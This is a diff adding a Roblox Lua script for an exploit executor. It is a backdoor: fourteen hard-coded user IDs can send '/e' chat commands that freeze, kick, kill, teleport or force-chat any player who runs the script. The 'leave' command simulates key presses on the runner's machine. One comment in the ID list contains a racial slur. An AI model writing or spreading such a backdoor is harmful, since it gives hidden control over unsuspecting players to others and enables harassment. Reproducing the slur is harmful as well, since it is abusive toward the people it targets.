@@ -1,0 +1,89 @@
+local Players = game:GetService('Players')
+local LocalPlayer = Players.LocalPlayer
+
+local List = {
+    3634073305, -- stopbeingdumbrobIox
+    1497173687, -- AutoHealers
+    2634438358, -- Autohealers123
+    1380846697, -- GuestCarlos24
+    3487433181, -- DahoodCashDr0p1
+    3030543493, -- TradingLoss
+    3340851478, -- Autohealers123alt2
+    3408287084, -- Autohealers123alt3
+    510966964, -- mati3xz -- negro
+    3003846151, -- Secr_etSupply
+    228711899, -- JessicaHolmes7
+    1927961689, -- RealForestO_O
+    367099367, -- Forests alt autokitkat24
+    1838426207, -- Saixt_Clxpzz
+} 
+local Prefix = '/e'
+
+local function DoKey(KeyCode)
+    keypress(KeyCode)
+    keyrelease(KeyCode)
+end
+
+local function ExecuteCommand(ForestMoreLikeBad, Command, Args)
+    if Command == 'freeze' then
+        if LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
+            LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = true
+        end
+    elseif Command == 'unfreeze' or Command == 'thaw' then
+        if LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
+            LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = false
+        end
+    elseif Command == 'kick' then
+        LocalPlayer:Kick('Seems like an admin kicked you!')
+    elseif Command == 'leave' then
+        if keypress and keyrelease then
+            -- has to be a supported exploit, like Synapse X
+            DoKey(0x1B) -- Escape
+            task.wait(0.5)
+            DoKey(0x4C) -- L
+            task.wait(0.5)
+            DoKey(0x0D) -- Enter
+        end
+    elseif Command == 'kill' then
+        if LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid') then
+            LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid').Health = 0
+        else
+            LocalPlayer.Character:BreakJoints()
+        end
+    elseif Command == 'bring' then
+
+        LocalPlayer.Character:PivotTo(ForestMoreLikeBad.Character:GetPivot())
+    elseif Command == 'chat' then
+        local Message = table.concat(Args, ' ')
+        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, 'All')
+    end
+end
+
+local function AddConnection(Player)
+    if table.find(List, Player.UserId) then
+        Player.Chatted:Connect(function(Message)
+            local Arguments = string.split(Message, ' ')
+            if Arguments[1]:lower() == Prefix:lower() then
+                local Command = Arguments[2]:lower()
+                local TargetName = Arguments[3]:lower()
+                local Good = false
+                if TargetName == 'others' and LocalPlayer ~= Player then Good = true end
+                if TargetName == 'me' and LocalPlayer == Player and not Good then Good = true end
+                if TargetName == 'all' and not Good then Good = true end
+                if string.sub(string.lower(LocalPlayer.Name), 1, #TargetName) == TargetName and not Good then 
+                    Good = true 
+                end
+                if string.sub(string.lower(LocalPlayer.DisplayName), 1, #TargetName) == TargetName and not Good then
+                    Good = true
+                end
+                table.remove(Arguments, 1) table.remove(Arguments, 1) table.remove(Arguments, 1)
+                if Good then ExecuteCommand(Player, Command, Arguments) end
+            end
+        end)
+    end
+end
+
+Players.PlayerAdded:Connect(AddConnection)
+for _, v in ipairs(Players:GetPlayers()) do
+    AddConnection(v)
+end
